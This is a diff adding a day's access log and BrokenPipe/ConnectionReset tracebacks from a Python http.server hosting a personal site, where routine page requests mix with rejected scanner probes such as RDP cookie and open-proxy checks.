@@ -9424,3 +9424,2100 @@ BrokenPipeError: [Errno 32] Broken pipe
 39.144.134.85 - - [07/Apr/2024 11:16:02] "GET /favicon-16x16.png HTTP/1.1" 200 -
 39.144.134.85 - - [07/Apr/2024 11:16:02] "GET /favicon-32x32.png HTTP/1.1" 200 -
 223.104.209.204 - - [07/Apr/2024 11:17:22] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 304 -
+223.104.209.204 - - [07/Apr/2024 11:24:05] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 304 -
+223.104.209.204 - - [07/Apr/2024 11:26:07] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 304 -
+----------------------------------------
+Exception occurred during processing of request from ('35.203.210.224', 50128)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+223.104.209.204 - - [07/Apr/2024 11:28:57] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 304 -
+78.128.114.22 - - [07/Apr/2024 11:43:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+78.128.114.22 - - [07/Apr/2024 11:43:38] "  /*à     Cookie: mstshash=Administr" 400 -
+157.254.20.101 - - [07/Apr/2024 11:46:40] "GET / HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:41] "GET /images/wxf.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:41] "GET /css/font.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:41] "GET /css/reset.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:41] "GET /css/smigle.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:42] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:42] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:44] "GET /project/ HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 3153)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [07/Apr/2024 11:46:45] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:45] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:48] "GET /resource/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8+%E6%90%AD%E7%A7%AF%E6%9C%A8/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:48] "GET /img/Snipaste_2024-04-02_00-52-21.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:49] "GET /img/Snipaste_2024-04-02_01-13-36.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:49] "GET /img/Snipaste_2024-04-02_01-14-11.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:49] "GET /img/Snipaste_2024-04-02_01-14-19.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:49] "GET /img/Snipaste_2024-04-02_01-14-36.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 26051)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 30291)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [07/Apr/2024 11:46:50] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:50] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 3271)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 30899)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 26355)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 25887)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [07/Apr/2024 11:46:53] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:54] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:46:54] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:49:43] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:49:48] "GET /favicon-32x32.png HTTP/1.1" 200 -
+223.104.209.204 - - [07/Apr/2024 11:50:33] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:53:07] "GET /resource/%E8%AE%BE%E8%AE%A1%E4%BA%BA%E7%94%9F-%E6%83%B3%E6%B3%95%E9%9B%8F%E5%BD%A2/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:53:08] "GET /img/%E6%97%A5%E5%BF%972_2023-09-09_23-36-21.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:53:08] "GET /img/%E6%97%A5%E5%BF%971_2023-09-09_23-35-46.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:53:08] "GET /img/Screenshot_2023-09-09-23-56-09-765_info.kfsoft.android.AppTimer2.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:53:08] "GET /img/IMG_20230910_000300.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:53:08] "GET /img/gtd_2023-09-09_23-48-23.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:54:57] "GET /resource/%E5%BB%B6%E8%BF%9F%E6%BB%A1%E8%B6%B3/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 11:55:03] "GET /resource/%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F%E5%8E%9F%E5%A7%8B%E8%B5%84%E6%96%99/ HTTP/1.1" 200 -
+113.87.158.201 - - [07/Apr/2024 11:55:34] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+113.87.158.201 - - [07/Apr/2024 11:55:34] "    c                           " 400 -
+223.104.209.204 - - [07/Apr/2024 12:03:37] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 304 -
+52.167.144.209 - - [07/Apr/2024 12:05:53] "GET /posts/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 12:26:25] "GET / HTTP/1.1" 200 -
+184.105.139.111 - - [07/Apr/2024 12:29:14] "GET / HTTP/1.1" 200 -
+184.105.139.119 - - [07/Apr/2024 12:29:56] "GET /favicon.ico HTTP/1.1" 200 -
+184.105.139.87 - - [07/Apr/2024 12:30:18] code 404, message File not found
+184.105.139.87 - - [07/Apr/2024 12:30:18] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+184.105.139.95 - - [07/Apr/2024 12:30:41] code 501, message Unsupported method ('CONNECT')
+184.105.139.95 - - [07/Apr/2024 12:30:41] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+78.128.114.22 - - [07/Apr/2024 12:43:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+78.128.114.22 - - [07/Apr/2024 12:43:44] "  /*à     Cookie: mstshash=Administr" 400 -
+157.254.20.101 - - [07/Apr/2024 12:45:45] "GET / HTTP/1.1" 304 -
+157.254.20.101 - - [07/Apr/2024 12:46:02] "GET /posts/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 12:46:10] "GET /project/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 12:46:16] "GET /about/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 12:52:57] "GET / HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 12:53:04] "GET /project/ HTTP/1.1" 200 -
+91.240.118.187 - - [07/Apr/2024 13:41:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+91.240.118.187 - - [07/Apr/2024 13:41:02] "  /*à     Cookie: mstshash=Administr" 400 -
+----------------------------------------
+Exception occurred during processing of request from ('162.142.125.214', 60870)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+162.142.125.214 - - [07/Apr/2024 14:06:11] "GET / HTTP/1.1" 200 -
+162.142.125.214 - - [07/Apr/2024 14:06:16] "GET / HTTP/1.1" 200 -
+162.142.125.214 - - [07/Apr/2024 14:06:17] code 505, message Invalid HTTP version (2.0)
+162.142.125.214 - - [07/Apr/2024 14:06:17] "PRI * HTTP/2.0" 505 -
+162.142.125.214 - - [07/Apr/2024 14:06:18] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+162.142.125.214 - - [07/Apr/2024 14:06:18] "GET /favicon-32x32.png HTTP/1.1" 200 -
+162.142.125.214 - - [07/Apr/2024 14:06:19] "GET /favicon-16x16.png HTTP/1.1" 200 -
+162.142.125.214 - - [07/Apr/2024 14:06:19] "GET /favicon.ico HTTP/1.1" 200 -
+223.104.209.204 - - [07/Apr/2024 14:07:38] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 200 -
+185.242.226.48 - - [07/Apr/2024 15:31:23] "GET / HTTP/1.1" 200 -
+185.242.226.48 - - [07/Apr/2024 16:02:51] "GET /favicon-16x16.png HTTP/1.1" 200 -
+185.242.226.48 - - [07/Apr/2024 16:02:51] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+185.242.226.48 - - [07/Apr/2024 16:02:52] "GET /favicon-32x32.png HTTP/1.1" 200 -
+185.242.226.48 - - [07/Apr/2024 16:02:52] "GET / HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('167.94.138.35', 43084)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+167.94.138.35 - - [07/Apr/2024 16:21:36] "GET / HTTP/1.1" 200 -
+167.94.138.35 - - [07/Apr/2024 16:21:40] "GET / HTTP/1.1" 200 -
+167.94.138.35 - - [07/Apr/2024 16:21:41] code 505, message Invalid HTTP version (2.0)
+167.94.138.35 - - [07/Apr/2024 16:21:41] "PRI * HTTP/2.0" 505 -
+167.94.138.35 - - [07/Apr/2024 16:21:42] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+167.94.138.35 - - [07/Apr/2024 16:21:43] "GET /favicon-32x32.png HTTP/1.1" 200 -
+167.94.138.35 - - [07/Apr/2024 16:21:46] "GET /favicon-16x16.png HTTP/1.1" 200 -
+167.94.138.35 - - [07/Apr/2024 16:21:48] "GET /favicon.ico HTTP/1.1" 200 -
+223.104.209.204 - - [07/Apr/2024 16:23:33] "GET /resource/%E5%9F%BA%E5%87%86%E6%AF%94%E5%AF%B9+%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/ HTTP/1.1" 304 -
+206.119.89.212 - - [07/Apr/2024 16:33:33] code 404, message File not found
+206.119.89.212 - - [07/Apr/2024 16:33:33] "GET /apps/admin/view/default/layui/css/layui.css HTTP/1.1" 404 -
+206.119.89.212 - - [07/Apr/2024 16:33:33] code 404, message File not found
+206.119.89.212 - - [07/Apr/2024 16:33:33] "GET /apps/admin/view/default/layui/css/layui.css HTTP/1.1" 404 -
+206.119.89.212 - - [07/Apr/2024 16:33:33] code 404, message File not found
+206.119.89.212 - - [07/Apr/2024 16:33:33] "GET /apps/admin/view/default/layui/css/layui.css HTTP/1.1" 404 -
+157.55.39.204 - - [07/Apr/2024 17:04:57] "GET /resource/health/ HTTP/1.1" 200 -
+209.97.181.51 - - [07/Apr/2024 17:19:02] code 404, message File not found
+209.97.181.51 - - [07/Apr/2024 17:19:02] "GET http://uplo.ad/?v=1&ip=117.50.186.154&port=8000 HTTP/1.1" 404 -
+198.235.24.156 - - [07/Apr/2024 18:14:32] "GET / HTTP/1.1" 200 -
+107.170.250.36 - - [07/Apr/2024 19:40:40] code 400, message Bad request version ('À\x14À')
+107.170.250.36 - - [07/Apr/2024 19:40:40] " {  w)¤m%Û}¬5.-{¶ RhÔ$Û}Ù1^õA¥Ë1^a  À/À+ÀÀÀÀ	ÀÀ" 400 -
+157.254.20.101 - - [07/Apr/2024 20:16:07] "GET / HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:08] "GET /images/wxf.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:08] "GET /css/font.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:08] "GET /css/smigle.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:08] "GET /css/reset.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:09] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:09] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:12] "GET /project/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:13] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 2939)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [07/Apr/2024 20:16:13] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:16] "GET /resource/%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F%E5%8E%9F%E5%A7%8B%E8%B5%84%E6%96%99/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:16:17] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+207.46.13.116 - - [07/Apr/2024 20:42:56] code 404, message File not found
+207.46.13.116 - - [07/Apr/2024 20:42:56] "GET /sitemap.xml.gz HTTP/1.1" 404 -
+157.254.20.101 - - [07/Apr/2024 20:53:47] "GET / HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:48] "GET /css/font.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:48] "GET /css/smigle.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:48] "GET /css/reset.css HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:48] "GET /images/wxf.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:49] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:50] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:51] "GET /project/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:52] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 15533)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [07/Apr/2024 20:53:53] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:55] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:56] "GET /img/1712492720_Bdgeohw2.jpg HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:56] "GET /img/202404072048.png HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:56] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:56] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:53:57] "GET /img/202404072047.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('157.254.20.101', 4917)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+157.254.20.101 - - [07/Apr/2024 20:54:30] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+157.254.20.101 - - [07/Apr/2024 20:54:31] "GET /img/202404072047.png HTTP/1.1" 304 -
+157.254.20.101 - - [07/Apr/2024 20:54:31] "GET /img/1712492720_Bdgeohw2.jpg HTTP/1.1" 200 -
